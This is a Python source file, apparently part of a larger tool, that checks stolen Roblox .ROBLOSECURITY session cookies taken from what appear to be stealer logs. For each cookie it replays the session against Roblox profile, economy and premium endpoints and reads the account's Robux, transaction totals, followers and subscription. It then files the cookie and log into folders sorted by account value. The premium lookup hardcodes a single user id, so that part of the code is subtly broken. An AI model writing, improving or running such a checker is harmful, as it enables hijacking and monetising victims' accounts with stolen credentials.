# -*- coding: utf-8 -*-
import threading

import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
import shutil
class roblox_checker():
    @staticmethod
    def create_file(create_path: str, cook: str, path: str, user_id: str, nick: str, friendscount: str, followerscount: str, followingscount: str, robux:str, file: str, incomingRobuxTotal: str
                    ,premiumStipendsTotal: str, robuxStipendAmount: str, expiration:str, subscriptionName:str):
        valid_path = StandartMethod.StandartMetod.validate_path_log(path)
        nick = StandartMethod.StandartMetod.validate(nick)
        dir_path = create_path+f"\\{nick} ROBUX({robux}) - Premium({subscriptionName}) - Followers({followerscount})"
        try:
            os.mkdir(dir_path)
        except OSError as error:
            pass
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Nick': nick,
                'User-id': user_id,
                'Robux': robux,
                'Friends-count': friendscount,
                'Followers-count': followerscount,
                'Followings-count': followingscount,
                'Incoming_robux_total': incomingRobuxTotal,
                'Premium_stipends_total': premiumStipendsTotal,
                'Robux_stipend_amount': robuxStipendAmount,
                'Expiration': expiration,
                'Subscription_name': subscriptionName
            }
        }
        with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
            json.dump(data, outfile, indent=4, ensure_ascii=False)
        shutil.copy(f'{file}\\{path}', f'{dir_path}\\{valid_path}')

        settings = StandartMethod.headless.get_settings()['Filter_settings']['Roblox']

        try:
            os.mkdir(f'{create_path}\\{settings["Full_log"]}')
        except:
            pass
        try:
            os.mkdir(f'{create_path}\\{settings["Robux_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Robux_path"]}\\{nick} ROBUX({robux}) - Premium({subscriptionName}) - Followers({followerscount})'
        if int(settings['Filter_robux']) <= int(robux):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')

        try:
            os.mkdir(f'{create_path}\\{settings["Followers_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Followers_path"]}\\{nick} ROBUX({robux}) - Premium({subscriptionName}) - Followers({followerscount})'
        if int(settings['Filter_followers']) <= int(followerscount):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')


        try:
            os.mkdir(f'{create_path}\\{settings["Premium_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Premium_path"]}\\{nick} ROBUX({robux}) - Premium({subscriptionName}) - Followers({followerscount})'
        prem = 1
        if str(settings['Filter_premium']).lower() == 'true':
            if prem < int(robuxStipendAmount):
                try:
                    os.mkdir(path_premium_log)
                except:
                    pass
                with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                    json.dump(data, outfile, indent=4, ensure_ascii=False)
                shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')
        else:
            if int(robuxStipendAmount) < 1:
                try:
                    os.mkdir(path_premium_log)
                except:
                    pass
                with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                    json.dump(data, outfile, indent=4, ensure_ascii=False)
                shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')
        random_int = random.randint(0,99999)
        shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\({random_int}){valid_path}')

        print(f"\n[{threading.current_thread().name}] Roblox Обнаружена валидная сессия\n"
              f"[{threading.current_thread().name}] Робаксы: {robux}\n"
               f"[{threading.current_thread().name}] Фолловеров: {followerscount}\n"
              f"[{threading.current_thread().name}] Тип подписки: {subscriptionName}\n"
              f"[{threading.current_thread().name}] Путь: {dir_path}")
    @staticmethod
    def checker(dict, account, path_log, file):
        headers = StandartMethod.StandartMetod.get_headers()
        cook = {
            ".ROBLOSECURITY": account['.ROBLOSECURITY'],
        }
        req = requests.get('https://www.roblox.com/home', headers=headers, cookies=cook)
        try:
            user_id = re.findall(r"data-userid=\"(.*?)\"", req.text)[0].strip()
            req = requests.get(f'https://www.roblox.com/users/{user_id}/profile', cookies=cook, headers=headers)
            nick = re.findall(r"data-displayName=\"(.*?)\"", req.text)[0].strip()
            friendscount = re.findall(r"data-friendscount=\"(.*?)\"", req.text)[0].strip()
            followerscount = re.findall(r"data-followerscount=\"(.*?)\"", req.text)[0].strip()
            followingscount = re.findall(r"data-followingscount=\"(.*?)\"", req.text)[0].strip()
            req = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, cookies=cook)
            robux = req.json()['robux']
            req = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary', headers=headers, cookies=cook).json()
            incomingRobuxTotal = str(req['incomingRobuxTotal'])
            premiumStipendsTotal = str(req['premiumStipendsTotal'])
            req = requests.get('https://premiumfeatures.roblox.com/v1/users/365557341/subscriptions', headers=headers, cookies=cook)
            try:
                req = req.json()
                robuxStipendAmount = str(req['robuxStipendAmount'])
                expiration = str(req['expiration'])
                subscriptionName = str(req['subscriptionName'])
            except:
                robuxStipendAmount = '0'
                expiration = '0'
                subscriptionName = '0'
            roblox_checker.create_file(f'{dict}',account['.ROBLOSECURITY'], path_log , user_id, nick, friendscount, followerscount, followingscount, robux, file, incomingRobuxTotal, premiumStipendsTotal, robuxStipendAmount, expiration, subscriptionName)
        except Exception as ex:
            pass